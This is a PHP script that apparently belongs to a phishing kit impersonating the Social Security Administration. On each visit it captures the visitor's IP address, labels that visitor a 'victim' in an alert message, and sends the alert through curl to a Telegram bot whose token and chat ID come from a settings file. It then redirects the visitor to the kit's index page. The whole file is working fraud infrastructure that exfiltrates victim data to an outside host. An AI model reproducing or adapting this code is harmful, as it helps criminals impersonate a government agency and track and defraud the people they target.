<?php
session_start();
error_reporting(0);


include "../setting.php";
$piip=$_SERVER['REMOTE_ADDR'];
$useragent=$_SERVER['HTTP_USER_AGENT'];
$date = date('m/d/Y h:i:s a', time());
$data="
INCOMING SSA VICTIM ALERT 📫
-$piip
";
$telegram=$telesave;
$txt=$data;
if($telegram=='Yessir'){
$send=['chat_id'=>$chat_id,'text'=>$txt];
$website="https://api.telegram.org/bot$bot_url";
$ch=curl_init($website.'/sendMessage');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result=curl_exec($ch);
curl_close($ch);
}
header("location:index.php");

?>